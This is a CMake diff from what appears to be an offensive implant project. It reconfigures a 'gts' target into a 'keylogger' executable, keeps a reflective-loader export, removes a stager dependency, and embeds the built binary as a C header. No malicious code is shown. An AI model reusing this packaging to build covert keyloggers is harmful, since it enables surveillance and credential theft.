@@ -23,16 +23,16 @@
 #
 
 file(GLOB_RECURSE SOURCE_FILES *.h *.cpp)
-add_library(gts SHARED ${SOURCE_FILES})
-target_link_libraries(gts shared ws2_32 hooker)
-export_reflective_loader(gts)
+#add_library(keylogger SHARED ${SOURCE_FILES})
+add_executable(keylogger ${SOURCE_FILES})
+target_link_libraries(keylogger PUBLIC shared psapi)
+export_reflective_loader(keylogger)
 if (NOT MSVC)
-    target_link_libraries(gts mingw32 gcc mingwex gcc msvcrt)   # CRT
+    target_link_libraries(keylogger mingw32 gcc mingwex gcc msvcrt)   # CRT
 endif ()
-add_dependencies(gts stager)
 
 find_package (Python COMPONENTS Interpreter REQUIRED)
-add_custom_command(TARGET gts POST_BUILD
-    COMMAND ${Python_EXECUTABLE} -B ${CMAKE_SOURCE_DIR}/script/bin2h.py $<TARGET_FILE:gts> ${OUTPUT_BIN_DIRECTORY}/gts.dll.h GTS
-    COMMENT "Creating gts.dll.h"
+add_custom_command(TARGET keylogger POST_BUILD
+    COMMAND ${Python_EXECUTABLE} -B ${CMAKE_SOURCE_DIR}/script/bin2h.py $<TARGET_FILE:keylogger> ${OUTPUT_BIN_DIRECTORY}/keylogger.dll.h KEYLOGGER
+    COMMENT "Creating keylogger.dll.h"
 )
